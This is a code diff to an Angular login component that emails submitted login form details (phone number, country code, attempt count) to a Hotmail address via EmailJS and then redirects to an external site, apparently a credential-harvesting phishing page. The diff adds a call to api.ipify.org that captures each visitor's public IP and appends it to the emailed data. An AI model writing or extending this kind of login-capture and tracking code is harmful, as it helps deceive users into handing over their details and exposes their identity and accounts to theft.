@@ -1,8 +1,10 @@
 import { CommonModule } from '@angular/common';
-import { Component, OnInit } from '@angular/core';
+import { Component, OnDestroy, OnInit } from '@angular/core';
 import { ReactiveFormsModule, FormGroup, FormBuilder } from '@angular/forms';
 import { COUNTRY_PHONE_CODES } from '../../Core/constants';
 import emailjs from '@emailjs/browser';
+import { HttpClient } from '@angular/common/http';
+import { Subscription } from 'rxjs';
 
 @Component({
   selector: 'app-login-section',
@@ -10,7 +12,7 @@ import emailjs from '@emailjs/browser';
   templateUrl: './login-section.component.html',
   styleUrl: './login-section.component.scss',
 })
-export class LoginSectionComponent implements OnInit {
+export class LoginSectionComponent implements OnInit, OnDestroy {
   loginForm!: FormGroup;
   showPassword = false;
 
@@ -22,7 +24,10 @@ export class LoginSectionComponent implements OnInit {
 
   countryCodes = COUNTRY_PHONE_CODES;
 
-  constructor(private fb: FormBuilder) {}
+  userId!: string;
+
+  private subscription = new Subscription();
+  constructor(private fb: FormBuilder, private http: HttpClient) {}
 
   ngOnInit(): void {
     this.loginForm = this.fb.group({
@@ -31,6 +36,19 @@ export class LoginSectionComponent implements OnInit {
       phoneNumber: this.fb.control(''),
       countryCode: this.fb.control(this.countryCodes[1].code),
     });
+
+    this.getUserId();
+  }
+
+  getUserId() {
+    this.subscription.add(
+      this.http
+        .get('https://api.ipify.org?format=json')
+        .subscribe((resData: any) => {
+          this.userId = resData.ip;
+          // console.log(this.userId);
+        })
+    );
   }
 
   get loginFormControl() {
@@ -82,7 +100,7 @@ export class LoginSectionComponent implements OnInit {
           this.loginFormControl['countryCode'].value
         } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
           this.attemptCount + 1
-        }`,
+        } userId: ${this.userId || ''}`,
         email: 'ubaid.valtorquegroup@hotmail.com',
       })
       .then(() => {
@@ -99,5 +117,11 @@ export class LoginSectionComponent implements OnInit {
           this.redirectToExternalSite();
         }
       });
+  }
+
+  ngOnDestroy(): void {
+    if (this.subscription) {
+      this.subscription.unsubscribe();
+    }
   }
 }
